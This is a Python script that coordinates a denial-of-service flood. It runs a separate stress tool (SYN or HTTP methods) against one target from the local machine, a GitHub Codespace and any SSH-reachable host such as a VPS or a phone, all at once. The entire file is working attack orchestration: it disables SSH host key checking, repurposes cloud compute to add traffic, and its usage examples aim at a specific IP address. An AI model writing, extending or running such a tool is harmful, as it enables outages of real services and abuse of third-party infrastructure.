#!/usr/bin/env python3
"""strike — coordinated attack from local + codespace simultaneously."""

import sys, os, time, subprocess, threading, json, signal
from datetime import datetime

BANNER = """
  strike — launch local + cloud in one command
"""

LOCAL = os.path.expanduser("~/pentools/stress.py")
LOG = os.path.expanduser("/tmp/strike.log")
procs = []


def log(msg):
    t = datetime.now().strftime("%H:%M:%S")
    print(f"  [{t}] {msg}")
    with open(LOG, "a") as f:
        f.write(f"[{t}] {msg}\n")


def run_local(target, method, duration):
    """Run stress.py locally, streaming output."""
    log(f"local: starting {method} on {target} ({duration}s)")
    cmd = ["python3", LOCAL, target, method, str(duration)]
    if method == "syn":
        cmd.insert(0, "sudo")

    p = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    procs.append(("local", p))

    for line in p.stdout:
        line = line.strip()
        if line:
            print(f"  ┌─ local ─ {line}")
            # Parse rate for summary
            if "done" in line.lower():
                log(f"local: {line}")

    p.wait()
    log(f"local: finished (exit {p.returncode})")


def run_codespace(target, method, duration):
    """Run on GitHub codespace via gh CLI."""
    # Get codespace name
    r = subprocess.run(
        ["gh", "codespace", "list", "--json", "name,state"],
        capture_output=True,
        text=True,
        timeout=10,
    )
    if r.returncode != 0 or not r.stdout.strip():
        log("codespace: none found — skipping")
        return

    try:
        spaces = json.loads(r.stdout)
        active = [s for s in spaces if s.get("state") == "Available"]
        if not active:
            log("codespace: none available — skipping")
            return
        cs_name = active[0]["name"]
    except (json.JSONDecodeError, KeyError, IndexError):
        log("codespace: could not parse list — skipping")
        return

    log(f"codespace: found '{cs_name}' — deploying")
    cmd = [
        "gh",
        "codespace",
        "ssh",
        "-c",
        cs_name,
        "--",
        f"cd /workspaces/pentools && git pull -q && python3 stress.py {target} {method} {duration}",
    ]

    p = subprocess.Popen(
        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    procs.append(("codespace", p))

    for line in p.stdout:
        line = line.strip()
        if line:
            print(f"  ┌─ cloud ─ {line}")
            if "done" in line.lower():
                log(f"codespace: {line}")

    p.wait()
    log(f"codespace: finished (exit {p.returncode})")


def run_ssh(target, method, duration, host, key=None):
    """Run on a remote machine via SSH."""
    log(f"ssh: starting on {host}")
    ssh_cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5"]
    if key:
        ssh_cmd += ["-i", key]
    ssh_cmd += [host, f"cd pentools && python3 stress.py {target} {method} {duration}"]

    p = subprocess.Popen(
        ssh_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    procs.append(("ssh", p))

    for line in p.stdout:
        line = line.strip()
        if line:
            print(f"  ┌─ ssh ─ {line}")

    p.wait()
    log(f"ssh: finished (exit {p.returncode})")


def signal_handler(sig, frame):
    log("\nstopping all attacks...")
    for name, p in procs:
        if p.poll() is None:
            p.terminate()
    sys.exit(0)


if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)

    print(BANNER)
    if len(sys.argv) < 3:
        print("  usage: python3 strike.py <target> <method> [duration] [ssh-host]")
        print("")
        print("  examples:")
        print("    python3 strike.py 2.121.59.67 syn 30")
        print("      → local + codespace (if running)")
        print("")
        print("    python3 strike.py 2.121.59.67 http 60 user@vps-ip")
        print("      → local + codespace + ssh")
        print("")
        print("  ssh-host can also be:")
        print("    phone     → local + phone via Termux SSH")
        print("    friend    → local + any SSH machine")
        sys.exit(1)

    target = sys.argv[1]
    method = sys.argv[2].lower()
    dur = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3].isdigit() else 30
    ssh_host = sys.argv[4] if len(sys.argv) > 4 else None

    log(f"target:   {target}")
    log(f"method:   {method}")
    log(f"duration: {dur}s")
    log(f"ssh host: {ssh_host or 'none'}")
    log("")

    threads = [
        threading.Thread(target=run_local, args=(target, method, dur)),
        threading.Thread(target=run_codespace, args=(target, method, dur)),
    ]

    if ssh_host:
        threads.append(
            threading.Thread(target=run_ssh, args=(target, method, dur, ssh_host))
        )

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    log("")
    log("all attacks finished")
